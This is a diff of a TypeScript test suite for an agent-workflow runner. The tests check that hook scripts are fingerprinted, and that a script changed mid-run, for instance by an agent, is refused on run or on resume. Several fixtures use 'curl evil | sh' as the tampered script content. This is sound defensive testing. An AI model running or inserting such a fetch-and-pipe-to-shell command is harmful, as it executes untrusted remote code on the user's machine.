@@ -393,8 +393,8 @@ describe("resuming a saved run", () => {
 
 describe("a Hook node that runs without asking", () => {
   const SCRIPT = "scripts/gate.sh";
-  const CHANGED = `Hook script ${SCRIPT} was changed during this run; review it, then run it from the Hooks tab.`;
-  const CHANGED_BY_AGENT = `Hook script ${SCRIPT} was changed by an agent during this run; review it, then run it from the Hooks tab.`;
+  const CHANGED = `Hook script ${SCRIPT} was changed during this run; review it, then run it from the Hooks tab or start a new run.`;
+  const CHANGED_BY_AGENT = `Hook script ${SCRIPT} was changed by an agent during this run; review it, then run it from the Hooks tab or start a new run.`;
   const notFound = () => new Error("IO error: not found (os error 2)");
 
   function hookNode(overrides: { id?: string; path?: string; requireConsent?: boolean } = {}): AgentNode {
@@ -583,28 +583,40 @@ describe("a Hook node that runs without asking", () => {
     expect(outcome.run.agents.Gate.error).not.toContain("was changed");
   });
 
-  it("is not started when Stop is pressed while its script is read", async () => {
+  it.each([
+    ["the script is the same", "echo hi\n"],
+    ["the script has changed", "curl evil | sh\n"], // the refusal that would otherwise fail the node
+  ])("is stopped, not started and not failed, when Stop is pressed while its script is read and %s", async (_case, textNow) => {
     const executed = hookRan();
+    const audit = auditFile();
     let stopped = false;
     let reads = 0;
-    const { host } = fakeHost({
+    const { host, log } = fakeHost({
       read_workspace_file: (args) => {
         if (args.relativePath !== SCRIPT) throw notFound();
-        if (++reads === 2) stopped = true; // the read just before the hook would run
+        if (++reads === 2) { // the read just before the hook would run
+          stopped = true;
+          return textNow;
+        }
         return "echo hi\n";
       },
       execute_hook: executed,
+      write_audit_entry: audit.write,
     }, { isCancelled: () => stopped });
 
     const outcome = await runWorkflow(runInput([hookNode()]), host);
 
     if (!outcome.started) throw new Error(outcome.error);
+    expect(reads).toBe(2);
     expect(executed).not.toHaveBeenCalled();
-    expect(outcome.run.agents.Gate).toMatchObject({ status: "stopped" });
+    expect(outcome.run.agents.Gate.status).toBe("stopped");
+    expect(outcome.run.agents.Gate.error).toBeUndefined();
     expect(outcome.run.status).toBe("cancelled");
+    expect(audit.writes).toEqual([]); // no refusal to record
+    expect(log.audit.map((e) => e.details).join("\n")).not.toContain("was changed");
   });
 
-  it("reads the script twice, when the run starts and just before the hook runs, and reads no script of a hook that needs consent", async () => {
+  it("reads every hook script when the run starts, and an unasked hook's again just before it runs", async () => {
     const read: string[] = [];
     const { host } = fakeHost({
       read_workspace_file: (args) => { read.push(String(args.relativePath)); throw notFound(); },
@@ -613,8 +625,8 @@ describe("a Hook node that runs without asking", () => {
 
     await runWorkflow(runInput([hookNode(), hookNode({ id: "Ask", path: "scripts/ask.sh", requireConsent: true })]), host);
 
-    expect(read.filter((path) => path === SCRIPT)).toHaveLength(2);
-    expect(read).not.toContain("scripts/ask.sh");
+    expect(read.filter((path) => path === SCRIPT)).toHaveLength(2); // the baseline, and the check before it runs
+    expect(read.filter((path) => path === "scripts/ask.sh")).toHaveLength(1); // the baseline only: it does not run
   });
 
   it("has a refusal for missing consent written to the workspace's audit log too", async () => {
@@ -647,7 +659,7 @@ describe("a Hook node that runs without asking", () => {
     expect(log.audit.map((e) => e.details)).toContain("Open a workspace to run hooks.");
   });
 
-  it("saves a SHA-256 of each script that runs without asking, not its text, and lists no other hook", async () => {
+  it("saves a SHA-256 of every hook script, a consent-required one's too, and never the text", async () => {
     const records: RunRecord[] = [];
     const files: Record<string, string> = { [SCRIPT]: "echo ok\n", "scripts/ask.sh": "echo ask\n" };
     const { host } = fakeHost({
@@ -658,25 +670,27 @@ describe("a Hook node that runs without asking", () => {
       },
       execute_hook: hookRan(),
     }, { saveRun: async (r) => { records.push(JSON.parse(JSON.stringify(r))); } });
-    // Gate's script is there, Ghost's is missing (null), Ask needs consent (not listed).
+    // Gate's script is there, Ghost's is missing (null), Ask needs consent (its script is fingerprinted too).
     const nodes = [hookNode(), hookNode({ id: "Ghost", path: "scripts/ghost.sh" }), hookNode({ id: "Ask", path: "scripts/ask.sh", requireConsent: true })];
 
     await runWorkflow(runInput(nodes), host);
 
-    const expected = { "agent-0": createHash("sha256").update("echo ok\n").digest("hex"), "agent-1": null };
+    const sha = (text: string) => createHash("sha256").update(text).digest("hex");
+    const expected = { "agent-0": sha("echo ok\n"), "agent-1": null, "agent-2": sha("echo ask\n") };
     expect(records[0].hookScripts).toEqual(expected); // from the very first save
     expect(records.at(-1)?.hookScripts).toEqual(expected);
     expect(JSON.stringify(records)).not.toContain("echo ok");
   });
 
-  it("saves no hookScripts for a workflow without such hooks", async () => {
+  it("always saves hookScripts, empty for a workflow whose hooks have no script", async () => {
     let record: RunRecord | undefined;
     const { host } = fakeHost({}, { saveRun: async (r) => { record = JSON.parse(JSON.stringify(r)); } });
+    const noScript = makeNode("Bare");
+    noScript.data.role = AgentRole.Hook; // a hook node with no script has nothing to fingerprint
 
-    await runWorkflow(runInput([makeNode("A"), hookNode({ requireConsent: true })]), host);
+    await runWorkflow(runInput([makeNode("A"), noScript]), host);
 
-    expect(record).toBeDefined();
-    expect(record).not.toHaveProperty("hookScripts");
+    expect(record?.hookScripts).toEqual({});
   });
 
   it("does not start where Web Crypto is missing and a hook would run without asking: the check is not weakened", async () => {
@@ -687,7 +701,13 @@ describe("a Hook node that runs without asking", () => {
 
       const outcome = await runWorkflow(runInput([hookNode()]), host);
 
-      expect(outcome).toEqual({ started: false, error: expect.stringContaining("Web Crypto") });
+      if (outcome.started) throw new Error("the run started without Web Crypto");
+      // It says what is missing and what needs it, and offers no way round it.
+      expect(outcome.error).toBe(
+        "Web Crypto is not available here (harness run needs Node 20 or later), " +
+        "and hooks that run without asking need it to check their scripts.",
+      );
+      expect(outcome.error).not.toMatch(/consent/i);
       expect(log.started).toEqual([]);
       expect(executed).not.toHaveBeenCalled();
 
@@ -732,10 +752,12 @@ describe("a Hook node that runs without asking", () => {
     }
 
     /** One attempt at the run, resuming `resume` if given; and the record it saved. */
-    async function attempt(handlers: Record<string, Handler>, resume?: RunRecord, nodes: AgentNode[] = mutatorThenGate()) {
+    async function attempt(
+      handlers: Record<string, Handler>, resume?: RunRecord, nodes: AgentNode[] = mutatorThenGate(), links: Edge[] = edges,
+    ) {
       let record: RunRecord | undefined;
       const { host } = fakeHost(handlers, { saveRun: async (r) => { record = JSON.parse(JSON.stringify(r)); } });
-      const outcome = await runWorkflow(runInput(nodes, edges, { resume }), host);
+      const outcome = await runWorkflow(runInput(nodes, links, { resume }), host);
       if (!outcome.started) throw new Error(outcome.error);
       return { outcome, record: record! };
     }
@@ -823,6 +845,102 @@ describe("a Hook node that runs without asking", () => {
       // A new run (no resume) takes its own baseline, and runs it.
       const fresh = await attempt(ws.handlers, undefined, mutatorThenGate("scripts/gate2.sh"));
       expect(fresh.outcome.run.agents.Gate.status).toBe("done");
+    });
+
+    const consentGate = () => [hookNode({ id: "Mutator", path: MUTATE }), hookNode({ requireConsent: true })];
+
+    it("keeps a consent-required hook's baseline, so dropping the requirement on resume does not start a new one", async () => {
+      const ws = workspace();
+      // Attempt 1: Gate needs consent, so it does not run, and Mutator changes its script meanwhile.
+      const first = await attempt(ws.handlers, undefined, consentGate());
+      expect(first.outcome.run.agents.Gate).toMatchObject({ status: "error", error: expect.stringContaining("manual consent") });
+      expect(first.record.hookScripts).toEqual({ "agent-0": sha256("echo mutate\n"), "agent-1": sha256("echo ok\n") }); // Gate's too
+      expect(ws.files[SCRIPT]).toBe("curl evil | sh\n");
+
+      // The workflow file is then edited (an agent can write it) to drop the requirement. The script on disk is no longer
+      // the one that was fingerprinted, and Gate runs unasked now.
+      const second = await attempt(ws.handlers, first.record, mutatorThenGate());
+
+      expect(second.outcome.run.agents.Gate).toMatchObject({ status: "error", error: CHANGED });
+      expect(ws.gateRan).toEqual([]);
+    });
+
+    it("keeps a baseline through an attempt in which the hook needs consent, and checks it when the hook runs unasked again", async () => {
+      const ws = workspace();
+      ws.state.mutating = false;
+      ws.state.gateExit = 1; // attempt 1: Gate runs unasked, and its hook fails for its own reasons
+      const first = await attempt(ws.handlers);
+      expect(first.record.hookScripts?.["agent-1"]).toBe(sha256("echo ok\n"));
+
+      // Attempt 2: Gate needs consent, and its script is changed meanwhile.
+      ws.files[SCRIPT] = "curl evil | sh\n";
+      const second = await attempt(ws.handlers, first.record, consentGate());
+      expect(second.record.hookScripts).toEqual(first.record.hookScripts); // carried on, not dropped
+
+      // Attempt 3: unasked again. The baseline is still attempt 1's.
+      ws.state.gateExit = 0;
+      const third = await attempt(ws.handlers, second.record);
+
+      expect(third.outcome.run.agents.Gate).toMatchObject({ status: "error", error: CHANGED });
+      expect(ws.gateRan).toEqual(["echo ok\n"]); // only attempt 1 ran it, as it was
+    });
+
+    it("refuses an unasked hook that has no baseline, a node added to the workflow since the first attempt, however often it is resumed", async () => {
+      const ws = workspace();
+      ws.state.mutating = false;
+      // Attempt 1 has only Mutator.
+      const first = await attempt(ws.handlers, undefined, [hookNode({ id: "Mutator", path: MUTATE })], []);
+      expect(first.record.hookScripts).toEqual({ "agent-0": sha256("echo mutate\n") });
+
+      // The workflow file gains a Gate hook that runs unasked.
+      const second = await attempt(ws.handlers, first.record);
+      expect(second.outcome.run.agents.Gate).toMatchObject({
+        status: "error",
+        error: `Hook script ${SCRIPT} has no baseline from this run's first attempt, so it is not run unasked; run it from the Hooks tab or start a new run.`,
+      });
+      expect(ws.gateRan).toEqual([]);
+      expect(second.record.hookScripts).toEqual(first.record.hookScripts); // no baseline was taken for it
+
+      // The refusal sticks: the next resume finds it just as unbaselined.
+      const third = await attempt(ws.handlers, second.record);
+      expect(third.outcome.run.agents.Gate.error).toContain("has no baseline from this run's first attempt");
+      expect(ws.gateRan).toEqual([]);
+
+      // A new run takes its own baselines, and runs it.
+      const fresh = await attempt(ws.handlers);
+      expect(fresh.outcome.run.agents.Gate.status).toBe("done");
+      expect(ws.gateRan).toEqual(["echo ok\n"]);
+    });
+
+    it("refuses an unasked hook added after a first attempt with no hook script at all: an empty record is a baseline too", async () => {
+      const ws = workspace();
+      ws.state.mutating = false;
+      // Attempt 1 has no hook with a script. Its record still has the field, empty.
+      const first = await attempt(ws.handlers, undefined, [makeNode("Plain")], []);
+      expect(first.record.hookScripts).toEqual({});
+
+      // The workflow file gains a Gate hook, whose script is already in place.
+      const second = await attempt(ws.handlers, first.record, [makeNode("Plain"), hookNode()], []);
+
+      expect(second.outcome.run.agents.Gate.error).toContain("has no baseline from this run's first attempt");
+      expect(ws.gateRan).toEqual([]);
+    });
+
+    it("counts a hookScripts field that is there but malformed as empty, and so trusts no unasked hook on its strength", async () => {
+      const ws = workspace();
+      ws.state.mutating = false;
+      ws.state.gateExit = 1;
+      const first = await attempt(ws.handlers);
+      ws.state.gateExit = 0;
+      // A record that was edited by hand: the field is not an object, or its entries are not fingerprints.
+      for (const broken of [null, "abc", [sha256("echo ok\n")], { "agent-1": 7 }]) {
+        const record = { ...first.record, hookScripts: broken } as unknown as RunRecord;
+
+        const resumed = await attempt(ws.handlers, record);
+
+        expect(resumed.outcome.run.agents.Gate.error, JSON.stringify(broken)).toContain("has no baseline from this run's first attempt");
+      }
+      expect(ws.gateRan).toEqual(["echo ok\n"]); // only the first attempt's
     });
   });
 });
@@ -1002,28 +1120,38 @@ describe("a gateway that routes differently when a revision re-runs it", () => {
   const feedback = (source: string, target: string): Edge =>
     ({ id: `fb-${source}-${target}`, source, target, data: { edgeKind: "feedback", label: "revise" } });
 
-  /** Runs the graph; every agent answers "<name>-out <its n-th call>", Gate routes by `routes` (one per call; a call
-   *  past the end repeats the last; a record names the routes of several gateways), Review answers REVISE once, then
-   *  PASS, and the agents in `fail` cannot be reached. */
-  async function run(nodes: AgentNode[], edges: Edge[], routes: string[] | Record<string, string[]>, fail: string[] = []) {
+  /** Runs the graph; every agent answers "<name>-out <its n-th call>" (or its entry in `replies`), Gate routes by
+   *  `routes` (one per call; a call past the end repeats the last; a record names the routes of several gateways),
+   *  Review answers REVISE once, then PASS, and the agents in `fail` cannot be reached. */
+  async function run(
+    nodes: AgentNode[], edges: Edge[], routes: string[] | Record<string, string[]>,
+    options: {
+      fail?: string[]; replies?: Record<string, string>; maxParallel?: number;
+      handlers?: Record<string, Handler>; host?: Partial<RunHost>;
+    } = {},
+  ) {
     const routesOf = Array.isArray(routes) ? { Gate: routes } : routes;
     const messages: Record<string, string[]> = {};
     const records: RunRecord[] = [];
-    const { host, log } = fakeHost({
+    const { host, log, commands } = fakeHost({
       call_ollama_api: (args) => {
         const name = who(args);
         const seen = (messages[name] ??= []);
         seen.push(String(args.userMessage));
-        if (fail.includes(name)) throw new Error("model crashed");
+        if (options.fail?.includes(name)) throw new Error("model crashed");
         if (name in routesOf) return routesOf[name][Math.min(seen.length, routesOf[name].length) - 1];
+        if (options.replies && name in options.replies) return options.replies[name];
         if (name === "Review") return seen.length === 1 ? "REVISE" : "PASS";
         return `${name.toLowerCase()}-out ${seen.length}`;
       },
-    }, { revealOutput: false, saveRun: async (record) => { records.push(JSON.parse(JSON.stringify(record))); } });
-    const outcome = await runWorkflow(runInput(nodes, edges), host);
+      ...options.handlers,
+    }, { revealOutput: false, saveRun: async (record) => { records.push(JSON.parse(JSON.stringify(record))); }, ...options.host });
+    const input = runInput(nodes, edges);
+    if (options.maxParallel) input.graph.executionSettings.maxParallel = options.maxParallel;
+    const outcome = await runWorkflow(input, host);
     if (!outcome.started) throw new Error(outcome.error);
     const counts = Object.fromEntries(nodes.map((n) => [n.id, messages[n.id]?.length ?? 0]));
-    return { outcome, messages, counts, record: records.at(-1)!, log };
+    return { outcome, messages, counts, record: records.at(-1)!, log, commands };
   }
 
   /** Draft → Gate → (Fast | Slow) → Review, and Review sends Draft back. */
@@ -1060,6 +1188,8 @@ describe("a gateway that routes differently when a revision re-runs it", () => {
     expect(record.nodes["agent-2"]).toMatchObject({ agent: "Fast", status: "skipped" });
     expect(record.nodes["agent-2"].output).toBeUndefined();
     expect(record.gatewayRoutes).toEqual({ "agent-1": "slow" });
+    // Slow is on the revision path: it ran, so nothing needs saying about it.
+    expect(log.audit.some((e) => /not on the revision path/.test(e.details ?? ""))).toBe(false);
   });
 
   it("takes the dropped branch's memory back too, so the reviewer does not read it from there", async () => {
@@ -1113,12 +1243,16 @@ describe("a gateway that routes differently when a revision re-runs it", () => {
       edge("Fast", "Review"), feedback("Review", "Draft"),
     ];
 
-    const { outcome, counts, record } = await run(nodes, edges, ['{"route":"fast"}', '{"route":"slow"}']);
+    const { outcome, counts, record, log } = await run(nodes, edges, ['{"route":"fast"}', '{"route":"slow"}']);
 
     expect(counts).toEqual({ Draft: 2, Gate: 2, Fast: 1, Slow: 0, Review: 1 });
     expect(outcome.run.agents.Fast.status).toBe("skipped");
     expect(outcome.run.agents.Review).toEqual({ agentId: "Review", agentName: "Review", status: "skipped" });
     expect(outcome.run.agents.Slow.status).toBe("skipped"); // live now, but off the path: it did not run
+    // The run says so: the chosen branch is empty, and the record should not leave that unexplained.
+    expect(log.audit.filter((e) => /not on the revision path/.test(e.details ?? "")).map((e) => [e.agentId, e.details])).toEqual([
+      ["Slow", "↺ Slow: a gateway now routes to it, but it is not on the revision path, so it did not run"],
+    ]);
     expect(record.outputs).toEqual({ "agent-0": "draft-out 2", "agent-1": '{"route":"slow"}' });
     expect(outcome.run.status).toBe("done");
   });
@@ -1164,12 +1298,88 @@ describe("a gateway that routes differently when a revision re-runs it", () => {
   it("counts a branch that failed and was then dropped as not having run, and keeps the failure in the audit", async () => {
     const { nodes, edges } = fastOrSlow();
 
-    const { outcome, messages, log } = await run(nodes, edges, ['{"route":"fast"}', '{"route":"slow"}'], ["Fast"]);
+    const { outcome, messages, log } = await run(nodes, edges, ['{"route":"fast"}', '{"route":"slow"}'], { fail: ["Fast"] });
 
     expect(messages.Review[0]).not.toContain("[From: Fast]"); // Fast never answered
     expect(outcome.run.agents.Fast).toEqual({ agentId: "Fast", agentName: "Fast", status: "skipped" }); // no error left on it
     expect(outcome.run.status).toBe("done"); // the failure belonged to a branch that is no longer part of the run
     expect(log.audit.some((e) => e.agentId === "Fast" && !e.success && /model crashed/.test(e.details ?? ""))).toBe(true);
+  });
+
+  it("does not run a node the scheduler had queued behind a node that was dropped", async () => {
+    // maxParallel 1: Review runs while Side, fed only by Fast, waits its turn. The revision drops Fast, and with it
+    // what Side would run on, so Side must not call the model at all.
+    const { nodes, edges } = fastOrSlow();
+
+    const { outcome, counts, record, log } = await run([...nodes, makeNode("Side")], [...edges, edge("Fast", "Side")],
+      ['{"route":"fast"}', '{"route":"slow"}'], { maxParallel: 1 });
+
+    expect(counts).toEqual({ Draft: 2, Gate: 2, Fast: 1, Slow: 1, Review: 2, Side: 0 });
+    expect(outcome.run.agents.Side).toEqual({ agentId: "Side", agentName: "Side", status: "skipped" });
+    expect(record.outputs).not.toHaveProperty("agent-5"); // Side is the sixth node
+    expect(log.audit.some((e) => e.agentId === "Side" && e.details === "skipped by gateway routing")).toBe(true);
+    expect(outcome.run.status).toBe("done");
+  });
+
+  it("never asks for or runs a shell command of a node queued behind a dropped reviewer", async () => {
+    // Review's only input is Fast: when the new route drops Fast it drops Review, and Publish, which follows Review,
+    // must neither ask to push nor push.
+    const nodes = [makeNode("Draft"), gateNode(), makeNode("Fast"), makeNode("Slow"), makeNode("Review"),
+      makeNode("Publish", [ToolPermission.Bash])];
+    const edges = [
+      edge("Draft", "Gate"), edge("Gate", "Fast", "fast"), edge("Gate", "Slow", "slow"),
+      edge("Fast", "Review"), edge("Review", "Publish"), feedback("Review", "Draft"),
+    ];
+    const askCommand = vi.fn(async () => "granted" as const);
+    const executed = vi.fn(() => ({ exitCode: 0, stdout: "pushed", stderr: "", durationMs: 1 }));
+
+    const { outcome, counts, commands } = await run(nodes, edges, ['{"route":"fast"}', '{"route":"slow"}'], {
+      replies: { Publish: '<tool_call>{"name":"bash","args":{"command":"git push origin main"}}</tool_call>' },
+      handlers: { execute_command: executed },
+      host: { askCommand },
+    });
+
+    expect(counts.Publish).toBe(0);
+    expect(askCommand).not.toHaveBeenCalled();
+    expect(executed).not.toHaveBeenCalled();
+    expect(commands).not.toContain("execute_command");
+    expect(["Review", "Publish"].map((id) => outcome.run.agents[id].status)).toEqual(["skipped", "skipped"]);
+    expect(outcome.run.status).toBe("done");
+  });
+
+  it("keeps the error of a failed node when the run is stopping at it, even if a revision then routes around it", async () => {
+    // continueOnError is off. Extra fails while Review, already running, asks for a revision, and the revision moves
+    // Gate off Extra's branch. The run ends in error because of Extra: its error must still be there to be read.
+    const nodes = [...fastOrSlow().nodes, makeNode("Extra")];
+    const edges = [...fastOrSlow().edges, edge("Gate", "Extra", "fast")];
+    let failExtra: (error: Error) => void = () => {};
+    const calls: Record<string, number> = {};
+    const { host, log } = fakeHost({
+      call_ollama_api: async (args) => {
+        const name = who(args);
+        calls[name] = (calls[name] ?? 0) + 1;
+        if (name === "Extra") return new Promise<string>((_, reject) => { failExtra = reject; }); // still working
+        if (name === "Gate") return calls.Gate === 1 ? '{"route":"fast"}' : '{"route":"slow"}';
+        if (name === "Review") {
+          if (calls.Review > 1) return "PASS";
+          failExtra(new Error("model crashed")); // Extra fails while this review is in flight
+          while (!log.agents.some(([id, partial]) => id === "Extra" && partial.status === "error")) {
+            await new Promise((resolve) => setTimeout(resolve, 5));
+          }
+          return "REVISE";
+        }
+        return `${name.toLowerCase()}-out ${calls[name]}`;
+      },
+    }, { revealOutput: false });
+
+    const outcome = await runWorkflow(runInput(nodes, edges, { continueOnError: false }), host);
+
+    if (!outcome.started) throw new Error(outcome.error);
+    expect(outcome.run.status).toBe("error");
+    expect(outcome.run.agents.Extra).toMatchObject({ status: "error", error: expect.stringContaining("model crashed") });
+    expect(outcome).not.toHaveProperty("error"); // a node's failure: its error is on the node
+    expect(outcome.run.agents.Fast.status).toBe("skipped"); // what finished is still dropped
+    expect(log.audit.some((e) => e.agentId === "Extra" && /routes around it/.test(e.details ?? ""))).toBe(false);
   });
 
   it("keeps everything as it was when the gateway routes to the same branch again", async () => {
